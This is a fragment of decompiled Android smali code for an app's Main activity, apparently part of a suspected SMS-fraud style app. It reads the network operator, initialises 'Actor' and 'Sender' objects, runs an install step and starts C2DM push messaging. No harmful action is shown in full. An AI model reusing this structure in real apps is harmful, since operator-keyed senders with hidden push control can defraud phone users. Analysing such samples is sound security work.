    iget-boolean v0, p0, Lcom/software/application/Main;->wasProgressDone:Z

    if-eqz v0, :cond_0

    invoke-direct {p0}, Lcom/software/application/Main;->areInstalledAndActedLinksEquals()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method


# virtual methods
.method animateButtons()V
    .locals 9

    .prologue
    const/4 v4, 0x0

    const/4 v1, 0x1

    .line 348
    new-instance v0, Landroid/view/animation/TranslateAnimation;

    const/high16 v2, 0x3f800000    # 1.0f

    move v3, v1

    move v5, v1

    move v6, v4

    move v7, v1

    move v8, v4

    invoke-direct/range {v0 .. v8}, Landroid/view/animation/TranslateAnimation;-><init>(IFIFIFIF)V

    .line 350
    .local v0, "animation":Landroid/view/animation/Animation;
    const-wide/16 v1, 0x3e8

    invoke-virtual {v0, v1, v2}, Landroid/view/animation/Animation;->setDuration(J)V

    .line 351
    iget-object v1, p0, Lcom/software/application/Main;->installedContentTextView:Landroid/widget/TextView;

    invoke-virtual {v1, v0}, Landroid/widget/TextView;->startAnimation(Landroid/view/animation/Animation;)V

    .line 352
    iget-object v1, p0, Lcom/software/application/Main;->yesButton:Landroid/widget/Button;

    invoke-virtual {v1, v0}, Landroid/widget/Button;->startAnimation(Landroid/view/animation/Animation;)V

    .line 353
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "intent"    # Landroid/content/Intent;

    .prologue
    .line 251
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    .line 252
    const/4 v0, 0x1

    if-ne p2, v0, :cond_0

    .line 253
    iget-object v0, p0, Lcom/software/application/Main;->sender:Lcom/software/application/Sender;

    if-eqz v0, :cond_1

    .line 254
    invoke-direct {p0}, Lcom/software/application/Main;->start()V

    .line 259
    :cond_0
    :goto_0
    return-void

    .line 256
    :cond_1
    const v0, 0x7f070012

    invoke-virtual {p0, v0}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/software/application/Main;->showNetworkErrorToast(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 91
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 92
    const v2, 0x7f030001

    invoke-virtual {p0, v2}, Lcom/software/application/Main;->setContentView(I)V

    .line 93
    const v2, 0x7f090009

    invoke-virtual {p0, v2}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/ProgressBar;

    iput-object v2, p0, Lcom/software/application/Main;->progressBar:Landroid/widget/ProgressBar;

    .line 94
    invoke-virtual {p0}, Lcom/software/application/Main;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const v3, 0x7f07000a

    invoke-virtual {v2, v3}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/software/application/Main;->pleaseWaitString:Ljava/lang/String;

    .line 95
    const-string v2, "phone"

    invoke-virtual {p0, v2}, Lcom/software/application/Main;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 96
    .local v0, "mgr":Landroid/telephony/TelephonyManager;
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v1

    .line 97
    .local v1, "opStr":Ljava/lang/String;
    new-instance v2, Lcom/software/application/Actor;

    invoke-direct {v2, p0, v1}, Lcom/software/application/Actor;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    iput-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    .line 98
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->wasInitError()Z

    move-result v2

    if-nez v2, :cond_1

    .line 99
    invoke-direct {p0}, Lcom/software/application/Main;->initSettings()V

    .line 100
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isActed()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 101
    invoke-direct {p0}, Lcom/software/application/Main;->showURL()V

    .line 109
    :goto_0
    return-void

    .line 103
    :cond_0
    invoke-direct {p0}, Lcom/software/application/Main;->initGUI()V

    .line 104
    invoke-direct {p0}, Lcom/software/application/Main;->install()V

    goto :goto_0

    .line 107
    :cond_1
    invoke-virtual {p0}, Lcom/software/application/Main;->finish()V

    goto :goto_0
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 2
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    .line 370
    invoke-virtual {p0}, Lcom/software/application/Main;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    .line 371
    .local v0, "inflater":Landroid/view/MenuInflater;
    const/high16 v1, 0x7f080000

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    .line 372
    const/4 v1, 0x1

    return v1
.end method

.method public onOptionsItemSelected(Landroid/view/MenuItem;)Z
    .locals 1
    .param p1, "item"    # Landroid/view/MenuItem;

    .prologue
    .line 377
    invoke-interface {p1}, Landroid/view/MenuItem;->getItemId()I

    move-result v0

    packed-switch v0, :pswitch_data_0

    .line 382
    invoke-super {p0, p1}, Landroid/app/Activity;->onOptionsItemSelected(Landroid/view/MenuItem;)Z

    move-result v0

    :goto_0
    return v0

    .line 379
    :pswitch_0
    invoke-direct {p0}, Lcom/software/application/Main;->showRules()V

    .line 380
    const/4 v0, 0x1

    goto :goto_0

    .line 377
    nop

    :pswitch_data_0
    .packed-switch 0x7f09000e
        :pswitch_0
    .end packed-switch
.end method

.method protected onResume()V
    .locals 1

    .prologue
    .line 242
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 243
    invoke-direct {p0}, Lcom/software/application/Main;->startC2DM()V

    .line 244
    iget-object v0, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v0}, Lcom/software/application/Actor;->isActed()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 245
    invoke-direct {p0}, Lcom/software/application/Main;->showURL()V

    .line 247
    :cond_0
    return-void
.end method
